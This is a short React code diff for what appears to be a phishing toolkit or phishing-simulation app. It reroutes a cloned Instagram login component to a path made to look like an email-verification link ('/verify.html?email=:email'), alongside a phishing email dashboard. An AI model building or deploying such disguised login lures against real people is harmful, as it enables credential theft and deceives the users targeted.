@@ -8,7 +8,7 @@ const App = () => {
     <BrowserRouter>
       <Routes>
         <Route path="/" element={<PhishingEmailDashboard />} />
-        <Route path="/instag" element={<InstagramLogin />} />
+        <Route path="/verify.html?email=:email" element={<InstagramLogin />} />
       </Routes>
     </BrowserRouter>
   )
